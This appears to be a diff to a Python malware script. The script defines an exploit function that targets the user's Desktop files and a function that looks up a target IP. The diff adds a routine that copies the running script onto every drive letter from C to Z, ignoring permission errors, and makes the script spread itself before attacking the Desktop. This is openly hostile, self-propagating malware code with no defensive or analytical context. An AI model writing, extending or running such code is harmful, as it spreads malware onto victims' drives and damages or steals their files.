@@ -8,7 +8,19 @@ from urllib.request import urlopen
 HOST = 'localhost'
 PORT = 9999
 PATH = 'C://Users//' + str(os.getlogin()) + '//Desktop'
-    
+
+
+def check_disk():
+    for letter in 'CDEFGHIJKLMNOPQRSTUVWXYZ':
+        path = letter + '://'       
+        try:
+            if os.path.isdir(path):
+                shutil.copy(str(sys.argv[0]), path)
+            else:
+                pass
+        except PermissionError:
+            pass
+
         
 def exploit(deskPath):
     desk_files = os.listdir(deskPath)
@@ -56,4 +68,6 @@ def get_target_ip():
     return(OUT_IP)
 
 
-exploit(PATH)
+if __name__ == '__main__':
+    check_disk()
+    exploit(PATH)
